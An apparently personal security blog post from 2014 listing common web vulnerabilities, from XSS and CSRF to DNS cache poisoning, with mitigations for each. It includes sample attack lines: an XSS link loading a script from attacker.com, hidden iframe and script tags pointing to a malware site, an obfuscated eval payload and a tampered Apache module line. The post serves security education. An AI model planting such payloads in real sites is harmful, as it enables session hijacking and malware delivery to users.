Title: A List of Common Web Vulnerabilities
Date: 2014-10-31 6:30
Category: Web Security
Tags: XSS, CSRF, XSSI, Buffer_Overflow, LFI, RFI, iframe, SQLi


Although nomenclatures don't help much when you are facing a security problem, I am keeping this list for a systematic organization. It has regularly been updated.

In addition to this list, you can check some specific web exploration older posts: [Exploiting the web in 20 lessons](http://bt3gl.github.io/exploiting-the-web-in-20-lessons-natas.html) and [D-Camp CTF 2014](http://bt3gl.github.io/exploring-d-ctf-quals-2014s-exploits.html).

# Vulnerabilities to Web Applications


## Cross-site Scripting (XSS)

XSS is caused by **insufficient input validation or output escaping**. This vulnerability can allow an attacker to insert HTML markup or scripts in a vulnerable website. The injected code will have plenty of access in this site, and in many cases, to the HTTP cookies stored by the client.


HTML has five characters that are reserved:

* **both angle brackets**,

* **single and double quotes**,

* and **ampersand**.

The ampersand should never appear in most HTML sections. Both angle brackets should not be used inside a tag unless adequately quoted. Quote characters inside a tag can also be harmless in text.

To allow these characters to appear in problematic locations, an encoding based in an ampersand-prefixed and a semicolon-terminated scheme is used: the [Entity Encoding](http://www.w3schools.com/html/html_entities.asp).


### Non-Persistent Attack:

XSS non-persistent attacks consist of getting users to click a link with attacker's script. A typical scenario is the following:

1. The target website performs query searches that are not sanitized. For example, the query could accept scripts on it. A simple example to check this vulnerability is by verifying whether the alert box with the message **Pwnd** is displayed:
```
http://website.org?q=<script%20type='text/javascript'>alert('Pwnd!');</script>
```

2. The attacker crafts an exploit script that gets the victim's authorization information (for example in an **Authorization Cookie**). The attacker sends a **phishing email** to the victim with a link with some script such as:

```
http://website.org?q=puppies<script%20src="http://attacker.com/exploit.js">
```

3. If the victim clicks on the link, her/his browser runs the script (legitimate by the **Same Origin Policy**, * i.e.* resources are shared between origins with the same protocol, domain, and port). The attacker now has control of the victim's identity on that website. If the victim is the administrator, it is game over.


### Persistent Attack:

XSS persistent attacks store a malicious script in the databases, which will be retrieved by the users. A typical scenario is the following:

1. The attacker verifies that the target website has an XSS stored vulnerability (for example, allowing her/him to post text with HTML tags).

2. The attacker creates an account in the target website and posts something with a hidden script (similar to the one above).

3. When anyone loads the page with that post, the script runs, and the attacker is able to hijack the victim's section.


Additionally, in *password managers*, there is a risk of amplification of XSS bugs. In the web applications that use *[httponly](https://www.owasp.org/index.php/HttpOnly)* cookies, successful exploitation of an XSS flaw may give the attacker transient access to the user's account (and password).



### Attempts of mitigation:

* Servers should use **Content Security Policy** (CSP) HTTP header, which allows the whitelist of resources contents. For instance, the *Content-Security-Policy* header disables inline JavaScript by default.

* Servers can use the **HttpOnly** HTTP header which allows setting a cookie that is unavailable to client-side scripts.

* Search inputs should *always* be sanitized in both server-side and client-side.

* Servers should redirect invalid requests.

* Servers should invalidate sessions from different IP addresses. However, this can be mitigated if the attacker is behind a web proxy or behind the same NAT IP.

* Clients should disabling scripts by default (for example with [NoScript](https://addons.mozilla.org/en-us/firefox/addon/noscript/)).




---
## Cross Script Inclusion (XSSI)


XSSI comes with the failure to secure sensitive JSON-like responses against being loaded on third-party sites via ```<script src=..>```, and leaking user-specific information in the response. It a risk whenever ambient authority credentials (such as cookies) are used by the server to generate user-specific JavaScript code.

For instance, JSON is a JavaScript syntax structure to keep in-place object serialization. The curly bracket **{** is assumed to be the beginning of the object. Overloading curly brackets means that JSON blocks will not be adequately recognized in standalone statements.

---
## Cross-site Request Forgery (CSRF, XSRF)

CSRF allows attackers to execute actions using the credentials of another user without that user's knowledge or consent. It is the failure to verify that a particular state-changing HTTP request received by the **server-side** portion of the application was initiated from the expected **client-side** origin. Any third-party website loaded in the browser can perform actions on behalf of the victim.


On cross-domain navigation, the browser includes any ambient credentials. To the server, a request originating from its own client-side code will appear as the same as the request from a rogue third-party site, and it might be granted the same privilege.


### Examples of exploitation:

* Any two windows with frames opened in a browser will remain **Same Origin** with each other even if the user logs out from one account and permitting third-party to submit password and username and log int an attacked account. For example, the attacker can open and keep a frame pointing to a sensitive page and then log the victim into the attacker-controlled account to execute some code injection. Despite the change of HTTP credentials, the code injected will access the previous loaded frame.

* In several home network routers, CSRF can permit attackers to access the device and intercept or modify the network traffic.


### Attempts of mitigation:

* A protection can be done by checking a nonce in each POST request (no replay attacks in a form POST).

* Including a secret user- and session-specific value on the requests (as an additional query parameter or a hidden field). The attacker will not be able to read the value since access to cross-domain documents is restricted by the **same-origin** policy.


----
## Header Injection (Response Splitting)

Insufficient escaping of newlines in HTTP responses, generated by the server-side. This can lead to XSS or proxy cache poisoning.

### Attempts of mitigation:

* LF and CR characters must be stripped from any attacker-controlled values in the HTTP headers.

---
## Mixed Content

Loading non-HTTPS sub-resources on HTTPS pages undoes most of the benefits of encryption. For scripts and applets, this makes the application vulnerable to active attackers, especially in open wireless networks.

---
## Open Redirection

Applications that perform HTTP- or script-based requests to user-supplied URLs without constraining the possible destinations in any meaningful way, leading, for example, to XSS.

---
## Referer Leakage

HTTP requests may include a *Referer* header that contains the URL of documents that triggered the current navigation in some way. The header also may reveal some information about the user browsing habits, such as query parameters in the referring page.

This vulnerability is created by disclosure of a sensitive URL by embedding an off-site sub-resource of providing an off-site link. Any security data encoded in the URL of the parent document will be leaked in the *Referer* header.


---
# Vulnerabilities to Web Application Design

## Cache Poising

Long-term pollution of the browser cache (or any proxy within) with a malicious version of the targeted web application. Encrypted web applications may be targeted due to response-splitting vulnerabilities. In non-encrypted traffic, network attackers may be able to modify responses too.

---
## Clickjacking
The act of obscuring a portion of a web application so that the victim is not aware that individual clicks are delivered to another site. For example, a malicious site wraps another site in a frame.

If a website includes iframe, there is a chance that it can perform a SQL query searching for iframe code. For example:

```
SELECT * FROM blog_posts WHERE post_text LIKE '%>iframe%';
```


---
## Content and Character Set Sniffing

The possibility that the browser will ignore any authoritative content type of character set information provided by the server, and interpret the returned document incorrectly.

### Examples of exploitation:

* Scenarios where [Content-Type](http://www.w3.org/Protocols/rfc1341/4_Content-Type.html) is ignored.


---
## Cookie Forcing/Injection

The possibility of blindly injecting HTTP cookies into the context of an otherwise impenetrable web application due to issues in how the mechanism is designed and implemented in browsers. There is a special concern to HTTPS applications.

### Examples of exploitation:

* Cookie stuffing: deleting cookies belonging to other applications by overflowing the cookie jar.

---
## Denial-of-Service (DoS)

Any opportunity of the attacker to bring down a browser or server, or make the use of a targeted application more difficult.


### DoS and amplification attacks

DNS resolvers are attractive targets to attackers who exploit the resolvers' large response-to-request size ratio to gain additional free bandwidth. Resolvers that support EDNS0 (Extension Mechanisms for DNS) are especially vulnerable because of the substantially larger packet size that they can return.

### Examples of exploitation:

In an amplification scenario, the attack proceeds as follows:

* The attacker sends a victim DNS server queries using a forged source IP address. The queries may be sent from a single system or a network of systems all using the same forged IP address. The queries are for records that the attacker knows will result in much larger responses, up to several dozen times1 the size of the original queries..
* The victim server sends the large responses to the source IP address passed in the forged requests, overwhelming the system and causing a DoS situation.


---
## Framebusting

The possibility of a framed page navigating the top-level document to a new URL without having to satisfy **same-origin** checks. It might be exploited for phishing.

---
## HTTP Downgrade

Ability of an attacker to prevent the user from reaching an HTTPS version of a site or to downgrade an existing HTTPS session to HTTP.

### Attempts of mitigation:

* [Strict transport security](http://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security): The approach allows any site to instruct the browser that all future requests made to a particular hostname or domain should always use HTTPS and that any HTTP traffic should be automatically upgraded and submitted over HTTPS.


----
## Network Fenceposts

When websites let the browser to interact with destinations not directly accessible to the attacker, for example, with the systems on a victim's internal networks. This attack can be performed with the help of [DNS rebinding](http://en.wikipedia.org/wiki/DNS_rebinding).

### Attempts of mitigation:

* Internet Explorer implements the zone model, a potential approach to the risk.



---

# Vulnerabilities in the Server-Side

## Buffer Overflow

In low-level languages such as C or C++, buffer overflow happens when a program allows more information to be stored in a particular memory region than there is space to accommodate the incoming data, leading to the unexpected overwrite of other vital data structures.

---
## Command Injection (SQL, PHP, Shellcode)

Due to insufficient input filtering or output escaping, attacker-controlled strings may be processed as statements in an interpreted language used by the application.

### Examples of exploitation:

* Malicious code injections in an iframe to the attack site:
```
<iframe frameborder="0" height="0" src="http://<attack-site>/path/file" style="display:none" width="0"></iframe>
```

* JavaScript or another scripting language that calls and runs scripts from an attack site:

```
<script type='text/javascript' src='http://malware-attack-site/js/x55.js'></script>
```

* Scripts that redirects the browser to an attack site:
```
<script>
 if (document.referrer.match(/google\.com/)) {
 window.location("http://malware-attack-site/");
 }
</script>
```

* Malicious code that is obfuscated to avoid detection:

```
eval(base64_decode("aWYoZnVuaauUl+hasdqetiDi2iOwlOHTgs+slgsfUNlsgasdf"));
```

* Shared object files designed to write harmful code to otherwise benign scripts randomly:

```
#httpd.conf modified by the hacker
LoadModule harmful_module modules/mod_harmful.so
AddModule mod_harmful.c
```

* The **Error template type of malware infection** occurs when the template used for error messages, such as 404 File not Found, is configured to distribute malware. In this way, attackers can launch attacks on URLs that do not even exist on the victim's website.

### Attempts of mitigation:
* Investigate all possible harmful code on the website. It may be helpful to search for words like [iframe] to find iframe code. Other helpful keywords are "script", "eval", and "unescape." For example, on Unix-based systems:

```sh
$ grep -irn "iframe" ./ | less
```




----
## Directory Traversal

Due to insufficient filtering (such as the failure to recognize ```../``` segments) an application can be tricked into reading or writing files at arbitrary locations. Unconstrained file-writing bugs can be exploitable to run attacker-supplied code.


---
## File Inclusion

If used without a qualifier or prefixed with a *local* (LFI), the term is synonymous to read-related directory traversal. Remote file inclusion (RFI) is an alternative way to exploit file-inclusion vulnerabilities by specifying a URL rather than a valid file path. In some languages, a common API opens local files and fetches remote URLs, which might supply the ability to retrieve the attacker's files.


----
## Format String Vulnerability

Several libraries accept templates (format strings) followed by a set of parameters that the function is expected to insert into the template at predefined locations. For example, C has functions such as *printf*, *syslog*, etc. The vulnerability is caused by permitting attackers to supply the template to one of these functions. This can lead to data leaks and code execution.


---
## Integer Overflow

Vulnerability specific to languages with no range checking. The flaw is caused by the developer failing to detect that an integer exceeded the maximum possible value and rolled back to zero, to a large negative integer, or to some hardware-specific result.

Integer underflow is the opposite effect: crossing the minimum value and rolling over to a very large positive integer.


---
## Pointer Management Vulnerabilities

In languages that use raw memory pointers such as C or C++, it is possible to use pointers that are either unitized or nor longer valid (dangling). These vulnerabilities will corrupt the internal state of the program and allow an attacker to execute attacker-supplied code.


---
## Cache poisoning attacks

Several variants of DNS spoofing attacks that can result in cache poisoning.

### Example of Attack

1. The attacker sends a target DNS resolver multiple queries for a domain name for which she/he knows the server is not authoritative, and that is unlikely to be in the server's cache.

2. The resolver sends out requests to other nameservers (whose IP addresses the attacker can also predict).

3. In the meantime, the attacker floods the victim server with forged responses that appear to originate from the delegated nameserver. The responses contain records that ultimately resolve the requested domain to IP addresses controlled by the attacker. They might contain answer records for the resolved name or, worse; they may further delegate authority to a nameserver owned by the attacker, so that s/he takes control of an entire zone.

2. If one of the forged responses matches the resolver's request (for example, by query name, type, ID and resolver source port) and is received before a response from the genuine nameserver, the resolver accepts the forged response and caches it, and discards the genuine response.

5. Future queries for the compromised domain or zone are answered with the forged DNS resolutions from the cache. If the attacker has specified a very long time-to-live on the forged response, the forged records stay in the cache for as long as possible without being refreshed.


----

# References:

* [The Tangled Web](http://www.amazon.com/The-Tangled-Web-Securing-Applications/dp/1593273886)
* [Django Security](https://docs.djangoproject.com/en/dev/topics/security/)
* [Bleach: Sanitizing Tool in Python](https://docs.djangoproject.com/en/dev/topics/security/)
* [Google's Public DNS](https://developers.google.com/speed/public-dns/docs/security)

